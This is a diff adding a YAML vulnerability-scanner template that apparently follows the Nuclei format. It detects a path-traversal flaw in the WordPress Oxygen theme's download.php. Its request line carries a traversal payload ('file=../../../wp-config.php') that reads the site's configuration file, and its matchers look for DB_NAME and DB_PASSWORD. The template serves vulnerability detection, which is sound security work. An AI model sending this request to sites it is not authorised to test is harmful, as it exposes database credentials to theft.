@@ -1,0 +1,33 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - DB_NAME
+            - DB_PASSWORD
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/wp-content/themes/oxygen-theme/download.php?file=../../../wp-config.php'
+id: wp-oxygen-theme-lfi
+info:
+    author: 0x_Akoko
+    classification:
+        cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+        cvss-score: 7.5
+        cwe-id: CWE-22
+    description: WordPress Oxygen-Theme has a local file inclusion vulnerability via the 'file' parameter of 'download.php'.
+    metadata:
+        max-request: 1
+    name: WordPress Oxygen-Theme - Local File Inclusion
+    reference:
+        - https://cxsecurity.com/issue/WLB-2019030178
+    severity: high
+    tags:
+        - wordpress
+        - wp-theme
+        - WordPress
